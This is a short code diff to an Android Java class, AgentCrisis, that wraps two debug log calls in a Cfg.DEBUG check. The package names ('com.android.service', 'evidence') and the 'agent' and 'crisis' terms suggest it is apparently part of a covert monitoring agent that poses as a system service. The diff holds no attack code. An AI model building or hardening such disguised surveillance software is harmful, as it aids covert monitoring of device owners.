@@ -14,6 +14,7 @@ import java.io.IOException;
 import android.util.Log;
 
 import com.android.service.Status;
+import com.android.service.auto.Cfg;
 import com.android.service.evidence.Evidence;
 import com.android.service.util.DataBuffer;
 
@@ -53,7 +54,7 @@ public class AgentCrisis extends AgentBase {
 			// backward compatibility
 			Status.self().setCrisis(0xffffffff);
 
-			Log.d("QZ", TAG + " Info: " + "old configuration: " + type);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "old configuration: " + type);
 
 			return true;
 		}
@@ -67,7 +68,7 @@ public class AgentCrisis extends AgentBase {
 			return false;
 		}
 
-		Log.d("QZ", TAG + " Info: " + "type: " + type);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "type: " + type);
 
 		Status.self().setCrisis(type);
 
